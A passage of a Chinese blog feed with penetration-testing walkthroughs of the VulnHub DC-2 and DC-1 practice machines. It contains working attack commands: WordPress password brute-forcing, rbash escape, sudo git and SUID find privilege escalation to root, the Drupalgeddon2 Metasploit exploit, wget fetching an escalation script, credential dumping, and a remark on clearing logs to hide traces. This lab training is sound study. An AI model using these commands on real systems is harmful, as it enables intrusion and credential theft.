alt="image-20231013182338712"></p><p>查看保存的密码文件：</p><p><img src="/2023/10/15/DC-2/image-20231013182403584.png" alt="image-20231013182403584"></p><p>使用该密码文件继续尝试wpscan进行密码爆破：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">wpscan <span class="hljs-params">--url</span> http:<span class="hljs-string">//dc-2/</span> -P wp-dict.txt <span class="hljs-params">--usernames</span> admin,jerry,tom  <span class="hljs-string">//</span>通过搜集网站的信息组成的密码字典进行爆破，并且爆破成功，这很Social Engineering（社会工程学），综上，得到如下账户密码：<br>账户：jerry  密码：adipiscing<br> tom    parturient<br></code></pre></td></tr></table></figure><p><img src="/2023/10/15/DC-2/image-20231013182727155.png" alt="image-20231013182727155"></p><h4 id="flag2："><a href="#flag2：" class="headerlink" title="flag2："></a>flag2：</h4><p>得到账户密码登录网站页面：</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">登录成功后在pages标签中找到了fla<span class="hljs-name">g2</span><br></code></pre></td></tr></table></figure><p><img src="/2023/10/15/DC-2/image-20231013183335168.png" alt="image-20231013183335168"></p><p>flag2的详细信息为：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">走捷径？，可能是指获得<span class="hljs-keyword">shell</span><span class="language-bash">，另一个入口的话应该是有类似于文件上传的页面，寻找一下</span><br></code></pre></td></tr></table></figure><p><img src="/2023/10/15/DC-2/image-20231013183506227.png" alt="image-20231013183506227"></p><p>找到了一个上传图片的地方：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">尝试上传php文件不行，上传png图片报错，所以这就是不能利用wordpress走捷径，那另一个出口是？————我们有账号密码，登录，前面扫描端口，目标靶机开放了7744（ssh）服务端口<br></code></pre></td></tr></table></figure><p><img src="/2023/10/15/DC-2/image-20231013192231944.png" alt="image-20231013192231944"></p><p>尝试ssh登录：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">ssh <span class="hljs-symbol">tom@</span><span class="hljs-number">192.168</span><span class="hljs-number">.190</span><span class="hljs-number">.190</span> -p <span class="hljs-number">7744</span><br><span class="hljs-comment">//jerry不被允许进行ssh服务，尝试tom，tom登录成功</span><br></code></pre></td></tr></table></figure><p><img src="/2023/10/15/DC-2/image-20231013192754604.png" alt="image-20231013192754604"></p><h4 id="flag3："><a href="#flag3：" class="headerlink" title="flag3："></a>flag3：</h4><p>进入tom用户的命令行后发现很多命令不能使用（rbash）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">进入一个终端后，发现很多命令不能用，也不知道可以用的命令有哪些，可以尝试在/bin目录下<span class="hljs-built_in">ls</span>，但现在<span class="hljs-built_in">cd</span>不能用，<br>我们可以使用compgenm -c命令：<br></code></pre></td></tr></table></figure><p><img src="/2023/10/15/DC-2/image-20231013193938688.png" alt="image-20231013193938688"></p><p>使用compgen -c 查看可以使用的命令有哪些：</p><p><img src="/2023/10/15/DC-2/image-20231013194359636.png" alt="image-20231013194359636"></p><p>使用less成功查看到目标flag3信息：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">成功看到了flag3的信息，没什么用当前用户能干的事情还非常少，尝试各种命令脱身<br><span class="hljs-keyword">vi</span>、<span class="hljs-keyword">ls</span>、<span class="hljs-keyword">echo</span>等命令可以用，尝试写入<br></code></pre></td></tr></table></figure><p><img src="/2023/10/15/DC-2/image-20231013194223809.png" alt="image-20231013194223809"></p><p><img src="/2023/10/15/DC-2/image-20231013193715311.png" alt="image-20231013193715311"></p><p>尝试写入shell建立 </p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">发现<span class="hljs-regexp">/var/</span>www/html   根本不给写的权限<br></code></pre></td></tr></table></figure><p><img src="/2023/10/15/DC-2/image-20231014094422428.png" alt="image-20231014094422428"></p><p>搜索其他提权方法（来进行rbash逃逸）：</p><h4 id="rbash逃逸方法："><a href="#rbash逃逸方法：" class="headerlink" title="rbash逃逸方法："></a>rbash逃逸<a href="https://blog.csdn.net/qq_43168364/article/details/111830233">方法</a>：</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>rbash逃逸：什么是rbash：它与一般shell的区别在于会限制一些行为，让一些命令无法执行<br></code></pre></td></tr></table></figure><p><img src="/2023/10/15/DC-2/image-20231015092844396.png" alt="image-20231015092844396"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">可以看到 ‘/’ 被限制不能使用<br></code></pre></td></tr></table></figure><p><img src="/2023/10/15/DC-2/image-20231015092954584.png" alt="image-20231015092954584"></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-comment"># vim/vi进入之后</span><br><span class="hljs-symbol">:set</span> shell=<span class="hljs-regexp">/bin/sh</span> <span class="hljs-comment"># 或者用/bin/bash   //输入完之后回车，在点冒号：，然后输入shell回车，即可切换到新建的shell中</span><br><span class="hljs-symbol">:shell</span><br><br><span class="hljs-comment"># 切换完成之后还要添加环境变量。给$PATH变量增加两个路径，用来查找命令</span><br>export <span class="hljs-variable constant_">PATH</span>=<span class="hljs-variable">$PATH</span><span class="hljs-symbol">:/bin/</span><br>export <span class="hljs-variable constant_">PATH</span>=<span class="hljs-variable">$PATH</span><span class="hljs-symbol">:/usr/bin/</span><br></code></pre></td></tr></table></figure><p><img src="/2023/10/15/DC-2/image-20231015093636664.png" alt="image-20231015093636664"></p><h4 id="flag4："><a href="#flag4：" class="headerlink" title="flag4："></a>flag4：</h4><p>添加完环境变量后，尝试find命令查找flag</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-built_in">find</span> / -name <span class="hljs-string">&#x27;flag*&#x27;</span> <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure><p><img src="/2023/10/15/DC-2/image-20231015093945613.png" alt="image-20231015093945613"></p><h3 id="权限提升："><a href="#权限提升：" class="headerlink" title="权限提升："></a>权限提升：</h3><p>此时已经可以使用su命令了，切换到jerry用户看一看：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">su - jerry    <span class="hljs-regexp">//</span>加 - 是为了将环境变量也切换到jerry用户的<br></code></pre></td></tr></table></figure><p><img src="/2023/10/15/DC-2/image-20231015094948767.png" alt="image-20231015094948767"></p><p>使用sudo -l 看当前用户有没有可以执行的具有root权限的命令：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">发现git命令<br></code></pre></td></tr></table></figure><p><img src="/2023/10/15/DC-2/image-20231015095306921.png" alt="image-20231015095306921"></p><p>git提权 <a href="https://gtfobins.github.io/gtfobins/git/">方法</a></p><p><img src="/2023/10/15/DC-2/image-20231015095514672.png" alt="image-20231015095514672"></p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade">sudo git -p help config<br>!<span class="hljs-regexp">/bin/</span>sh<br></code></pre></td></tr></table></figure><p>输入sudo git -p help config命令后进入到如下界面，</p><p><img src="/2023/10/15/DC-2/image-20231015095555617.png" alt="image-20231015095555617"></p><h4 id="final-flag"><a href="#final-flag" class="headerlink" title="final_flag:"></a>final_flag:</h4><p>然后输入!&#x2F;bin&#x2F;sh即可提权:</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xquery">可以看到已经获得<span class="hljs-built_in">了root</span>权限<br></code></pre></td></tr></table></figure><p><img src="/2023/10/15/DC-2/image-20231015095703627.png" alt="image-20231015095703627"></p><p>进入root目录查找最后的flag：</p><p><img src="/2023/10/15/DC-2/image-20231015095745870.png" alt="image-20231015095745870"></p><h3 id="打靶总结"><a href="#打靶总结" class="headerlink" title="打靶总结:"></a>打靶总结:</h3><p>①靶机使用的wp框架是免费开源cms，因此它对应的漏洞就容易被人们发现，wpscan针对该框架的辅助工具能为我们提供帮助</p><p>②：使用cewl针对网站特殊信息进行扫描收集生成字典来用来爆破</p><p>③：rbash逃逸为我们逃脱各种命令不能使用的限制</p><p>④：git提权通过具有root权限的git建立的help帮助页面来进入root</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DC-1</title>
    <link href="/2023/10/12/DC-1/"/>
    <url>/2023/10/12/DC-1/</url>
    
    <content type="html"><![CDATA[<h1 id="DC-1："><a href="#DC-1：" class="headerlink" title="DC-1："></a>DC-1：</h1><h2 id="一、环境搭建："><a href="#一、环境搭建：" class="headerlink" title="一、环境搭建："></a>一、环境搭建：</h2><p>下载<a href="https://www.vulnhub.com/entry/dc-1,292/">DC-1</a>镜像：得到ova镜像文件，使用vm打开文件设置网络模式为nat</p><p>攻击机kali</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ip</span> <span class="hljs-number">192.168.190.130</span><br></code></pre></td></tr></table></figure><p>目标靶机DC-1</p><h2 id="二、渗透过程："><a href="#二、渗透过程：" class="headerlink" title="二、渗透过程："></a>二、渗透过程：</h2><h3 id="信息收集："><a href="#信息收集：" class="headerlink" title="信息收集："></a>信息收集：</h3><p>使用nmap工具扫描目标靶机：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -sP <span class="hljs-number">192.168.190.1</span>/<span class="hljs-number">24</span> //扫描同一网段存活的主机的ip，也可以使用arp-scan -l 进行扫描<br></code></pre></td></tr></table></figure><p><img src="/2023/10/12/DC-1/image-20231010134246863.png" alt="image-20231010134246863"></p><p>接下来使用nmap对指定的ip进行端口等信息进行扫描：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dns">nmap -<span class="hljs-keyword">A</span> -p- <span class="hljs-number">192.168.190.189</span><br>//nmap 扫描到了目标靶机开放的端口<span class="hljs-number">22</span>（ssh）<span class="hljs-number">80</span>（http）等，以及linux版本信息<span class="hljs-number">3.2-3.16</span>之间，网站采用的依赖框架为drupal <span class="hljs-number">7</span><br></code></pre></td></tr></table></figure><p><img src="/2023/10/12/DC-1/image-20231010135016691.png" alt="image-20231010135016691"></p><p>尝试访问80端口的页面服务：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">一个登陆页面，尝试抓包并使用sqlmap扫描注入点，没有找到，<br>尝试创建新账户，需要管理员确定，没办法尝试越权修改密码<br></code></pre></td></tr></table></figure><p><img src="/2023/10/12/DC-1/image-20231010140114794.png" alt="image-20231010140114794"></p><p>尝试访问robots.txt</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">发现该文件可以访问，但文件内容访问过程中发现均是一些没有用的信息<br></code></pre></td></tr></table></figure><p><img src="/2023/10/12/DC-1/image-20231010153239680.png" alt="image-20231010153239680"></p><p>扫描目录：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">在进行目录扫描的过程中，发现了xmlrpc.php，该文件一般在wordpress的框架下会存在，尝试访问<br></code></pre></td></tr></table></figure><p><img src="/2023/10/12/DC-1/image-20231011094635353.png" alt="image-20231011094635353"></p><p>访问该页面：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">xmlrpc服务接受的是<span class="hljs-built_in">post</span>型的请求，抓包看一下：<br></code></pre></td></tr></table></figure><p><img src="/2023/10/12/DC-1/image-20231011094839443.png" alt="image-20231011094839443"></p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">通过修改包的内容，利用xmlrpc的内置命令<span class="hljs-keyword">system</span>.listMethods，查看可以使用的命令有哪些：<br></code></pre></td></tr></table></figure><p><img src="/2023/10/12/DC-1/image-20231011100704744.png" alt="image-20231011100704744"></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/xmlrpc.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.190.189<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>91<br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">methodCall</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">methodName</span>&gt;</span>system.listMethods<span class="hljs-tag">&lt;/<span class="hljs-name">methodName</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">params</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">params</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">methodCall</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>发送修改后的包，看可以执行哪些命令：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">经过查询和测试，发现没有漏洞可以利用的点，目标靶机的xmlrpc服务所给的权限太少，使用wpscan也没有扫描到wordpress框架的存在，所以利用xmlrpc行不通<br></code></pre></td></tr></table></figure><p><img src="/2023/10/12/DC-1/image-20231011100751695.png" alt="image-20231011100751695"></p><h3 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h3><p>但由于目标靶机采用的drupal 7 的框架，可以使用msf工具自带的exp脚本进行利用：</p><p>开启msf：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">msfconsole</span>  并使用search drupal 来搜索相关的利用模块//使用序号<span class="hljs-number">0</span> rce失败，序号<span class="hljs-number">1</span>可以获得shell，序号<span class="hljs-number">2</span>也可以，序号<span class="hljs-number">3</span> au开头是辅助模块作用是文件读取，但对此靶机不适用，<br></code></pre></td></tr></table></figure><p><img src="/2023/10/12/DC-1/image-20231011103140176.png" alt="image-20231011103140176"></p><p>通过利用序号1，drupal_drupalgeddon2这个exp模块来进行攻击：</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gams">use <span class="hljs-number">1</span><br>show <span class="hljs-keyword">options</span>  <span class="hljs-comment">//查看该模块需要配置的参数有哪些：</span><br>可以看到RHOSTS是所必须的我们设置它为靶机的ip<br><span class="hljs-keyword">set</span> rhosts <span class="hljs-comment">192.168.190.189</span> <br></code></pre></td></tr></table></figure><p><img src="/2023/10/12/DC-1/image-20231011103359592.png" alt="image-20231011103359592"></p><p>设置完执行该模块：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">run  <span class="hljs-regexp">//</span>可以看到成功建立了meterpreter会话常用的命令网站：https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/haiyan123/</span>p/<span class="hljs-number">8990139</span>.html<br></code></pre></td></tr></table></figure><p><img src="/2023/10/12/DC-1/image-20231011103638157.png" alt="image-20231011103638157"></p><p>通过shell命令建立一个终端接口连接到靶机，我们可以在这里输入linux命令：</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss">在meterpreter的终端中使用<span class="hljs-built_in">shell</span> 建立一个<span class="hljs-built_in">shell</span>终端<br></code></pre></td></tr></table></figure><p><img src="/2023/10/12/DC-1/image-20231011104401850.png" alt="image-20231011104401850"></p><p>同时使用python来建立完整的交互式终端，方便一些命令的实施：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">python -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/2023/10/12/DC-1/image-20231011105204844.png" alt="image-20231011105204844"></p><h4 id="flag1："><a href="#flag1：" class="headerlink" title="flag1："></a>flag1：</h4><p>使用find命令查找带有flag关键字的文件：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">find</span> <span class="hljs-regexp">/ -name &quot;flag*&quot; 2&gt;/</span>dev<span class="hljs-regexp">/null      /</span><span class="hljs-regexp">/2&gt;/</span>dev/<span class="hljs-keyword">null</span>是将查询失败（权限不足）的信息重定向到这个黑洞，进入其中的信息会丢失<br>可以看到在home目录下存在一个flag4.txt<br>在<span class="hljs-regexp">/var/</span>www/目录下存在一个flag1.txt<br></code></pre></td></tr></table></figure><p><img src="/2023/10/12/DC-1/image-20231011113820474.png" alt="image-20231011113820474"></p><p>查看flag1：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">cat</span> flag1.txt <br>得到了一个提示信息 配置文件config？或者是setting或者是<span class="hljs-keyword">profile</span>，我们应该搜索drupal <span class="hljs-number">7</span> 的配置文件<br></code></pre></td></tr></table></figure><p><img src="/2023/10/12/DC-1/image-20231011114511870.png" alt="image-20231011114511870"></p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tap">通过浏览器搜索drupal<span class="hljs-number"> 7 </span>的默认配置文件为settings.php<br></code></pre></td></tr></table></figure><p><img src="/2023/10/12/DC-1/image-20231011114955183.png" alt="image-20231011114955183"></p><p>使用find命令进行查找：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-built_in">find</span> / -name <span class="hljs-string">&quot;setting*&quot;</span> <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span>  <span class="hljs-comment">// 找到如下文件，进行查看</span><br></code></pre></td></tr></table></figure><p><img src="/2023/10/12/DC-1/image-20231011123622245.png" alt="image-20231011123622245"></p><h4 id="flag2："><a href="#flag2：" class="headerlink" title="flag2："></a>flag2：</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">cat <span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/sites/</span>default/settings.php <br><span class="hljs-regexp">//</span>得到了一个数据库名：drupaldb 账户名：dbuser 密码：R0ck3t  ，而且数据库为mysql <span class="hljs-regexp">//</span>之前不是扫描到了登陆也面可以尝试登陆，登陆失败，但是mysql服务一般开启在<span class="hljs-number">3306</span>端口，前面进行端口扫描时，没发现<span class="hljs-number">3306</span>端口开放，先上传脚本文件，查看信息<br></code></pre></td></tr></table></figure><p><img src="/2023/10/12/DC-1/image-20231011123807744.png" alt="image-20231011123807744"></p><p>现在获得了flag1，和flag2，看到了flag4但没权限进不去，通过wget命令下载提权工具;</p><p>先kali开启http服务：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">python -m http.server <span class="hljs-number">6060</span>   <span class="hljs-regexp">//</span>开启http服务的方法很多<br></code></pre></td></tr></table></figure><p><img src="/2023/10/12/DC-1/image-20231011133344708.png" alt="image-20231011133344708"></p><p>靶机shell中wget下载：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget http://192.168.190.130:6060/suiduse.py<br>并通过<span class="hljs-built_in">chmod</span> 命令授予该脚本执行权限 <span class="hljs-built_in">chmod</span> 777 suiduse.py<br></code></pre></td></tr></table></figure><p><img src="/2023/10/12/DC-1/image-20231011133510909.png" alt="image-20231011133510909"></p><h3 id="权限提升："><a href="#权限提升：" class="headerlink" title="权限提升："></a>权限提升：</h3><h4 id="find命令提权："><a href="#find命令提权：" class="headerlink" title="find命令提权："></a>find命令提权：</h4><p>执行该脚本：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle">发现具有提权效果的<span class="hljs-keyword">find</span>命令<br>尝试输入：<span class="hljs-keyword">find</span> . -exec <span class="hljs-regexp">/bin/</span>sh -p \; -quit<br></code></pre></td></tr></table></figure><p><img src="/2023/10/12/DC-1/image-20231011133704911.png" alt="image-20231011133704911"></p><p>出现错误，说-p是非法选项，去掉-p试一下：</p><p><img src="/2023/10/12/DC-1/image-20231011133909293.png" alt="image-20231011133909293"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">find . -exec <span class="hljs-regexp">/bin/</span>sh  \; -quit <br><span class="hljs-regexp">//</span> -exec find命令对匹配的文件执行该参数所给出的shell命令。相应命令的形式为’command’ &#123; &#125; ;<br><span class="hljs-regexp">//</span> \; 表示 -exec 命令的结束。可以看到具有了临时root权限<br><span class="hljs-regexp">//</span> -quit 是立刻终止find命令<br>这个命令应该是通过find命令创建一个具有root权限的空间，在这空间里进行文件查询，但quit停止查询，但仍然停留在root权限的空间里，从而让执行该命令的用户临时拥有了root权限，此时使用python建立交互式界面就会退出该空间，进入到python建立的空间中<br></code></pre></td></tr></table></figure><p><img src="/2023/10/12/DC-1/image-20231011134012272.png" alt="image-20231011134012272"></p><p>python建立交互式界面：</p><p><img src="/2023/10/12/DC-1/image-20231011135404920.png" alt="image-20231011135404920"></p><h4 id="thefinalflag："><a href="#thefinalflag：" class="headerlink" title="thefinalflag："></a>thefinalflag：</h4><p>进入到root 目录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /root   得到thefinalflag ，至少还有flag3和flag4没有看到通过find命令进行查找<br></code></pre></td></tr></table></figure><p><img src="/2023/10/12/DC-1/image-20231011135455473.png" alt="image-20231011135455473"></p><h4 id="flag4："><a href="#flag4：" class="headerlink" title="flag4："></a>flag4：</h4><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-built_in">find</span> / -name <span class="hljs-string">&quot;flag*&quot;</span> <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span>  <span class="hljs-comment">//只有flag4，所以flag3很有可能在那个登陆页面中，先看flag4</span><br></code></pre></td></tr></table></figure><p><img src="/2023/10/12/DC-1/image-20231011135630768.png" alt="image-20231011135630768"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> flag4.txt   提示在/中有相同的flag，就是那个thefinalflag.txt，现在至少还有flag3.txt，登陆页面登陆不上，那只能使用之前找到mysql数据库的信息<br></code></pre></td></tr></table></figure><p><img src="/2023/10/12/DC-1/image-20231011135736655.png" alt="image-20231011135736655"></p><h4 id="靶机内登陆mysql："><a href="#靶机内登陆mysql：" class="headerlink" title="靶机内登陆mysql："></a>靶机内登陆mysql：</h4><p>没有对外开放3306端口，那就再靶机内部，即我们的shell中使用mysql登陆：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">mysql -u dbuser -p   <span class="hljs-regexp">//my</span>sql的登陆格式是这样的，-p 参数设定后按回车，我们接着输入密码才有效<br>R0ck3t<br></code></pre></td></tr></table></figure><p><img src="/2023/10/12/DC-1/image-20231011171925975.png" alt="image-20231011171925975"></p><p>此时进入数据库的命令行中，此刻这个mysql终端是连接这数据库的，我们可以查询数据库中的信息：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">show databases;    <span class="hljs-regexp">//</span>需要跟分号来结尾<br><span class="hljs-regexp">//</span>之前找到的信息中有这个drupaldb的数据库，而information_schema是在MySQL（版本<span class="hljs-number">5.0</span>以上）中看作是一个数据库，确切说是信息数据库。其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等。<br></code></pre></td></tr></table></figure><p><img src="/2023/10/12/DC-1/image-20231011172517211.png" alt="image-20231011172517211"></p><p>使用drupaldb数据库：</p><p><img src="/2023/10/12/DC-1/image-20231011173008556.png" alt="image-20231011173008556"></p><p>并通过show tables;</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">可以看到该数据库有一个<span class="hljs-built_in">users</span>表<br></code></pre></td></tr></table></figure><p><img src="/2023/10/12/DC-1/image-20231011181704618.png" alt="image-20231011181704618"></p><p>查看表中的信息：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">select * from users;<br><span class="hljs-regexp">//</span>两个用户一个admin 密码：<span class="hljs-variable">$S</span><span class="hljs-variable">$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5</span>.i38jnEKuDR<br>一个Fred 密码：<span class="hljs-variable">$S</span><span class="hljs-variable">$DWGrxef6</span>.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/<span class="hljs-number">9</span>TCGg<br><span class="hljs-regexp">//</span>可以看到这两个密码都通过hash进行了加密，保存起来尝试使用工具进行解密<br><span class="hljs-regexp">//</span>在最后一个表中watchdog，看门狗，里边存储了kali即攻击机的操作信息（日志文件）我们可以清除删除我们的记录不留痕迹<br></code></pre></td></tr></table></figure><p><img src="/2023/10/12/DC-1/image-20231011181854696.png" alt="image-20231011181854696"></p><p>使用john工具对hash密码解密：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">john passwd.txt --wordlist=<span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>rockyou.txt  <span class="hljs-regexp">//</span>解密非常慢尝试其他方法<br></code></pre></td></tr></table></figure><p><img src="/2023/10/12/DC-1/image-20231011183507022.png" alt="image-20231011183507022"></p><p>我们现在是在数据库的终端命令行中，可以使用增删改查的命令对数据库终端数据进行修改：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">使用show grants；  <span class="hljs-regexp">//</span> 查看当前用户的权限，应该是当前用户对该数据库完全掌控<br></code></pre></td></tr></table></figure><p><img src="/2023/10/12/DC-1/image-20231011183924092.png" alt="image-20231011183924092"></p><p>我们可以生成由已知明文加密后的hash值update表中用户的密码，从而达到修改密码的效果：</p><p>在靶机找到进行hash加密的文件：</p><p><img src="/2023/10/12/DC-1/image-20231011191504259.png" alt="image-20231011191504259"></p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-built_in">find</span> / -name <span class="hljs-string">&quot;*hash.sh*&quot;</span> <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure><p><img src="/2023/10/12/DC-1/image-20231011191829109.png" alt="image-20231011191829109"></p><p>执行该脚本文件：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">.<span class="hljs-regexp">/scripts/</span>password-hash.sh <span class="hljs-number">7898520</span>  得到：<span class="hljs-variable">$S</span><span class="hljs-variable">$DvsPzNMb2JwhlxyR9CKtjAmPKh</span>.qmsneaxJuHR4OHpm0gWaMsu5/<br>     <span 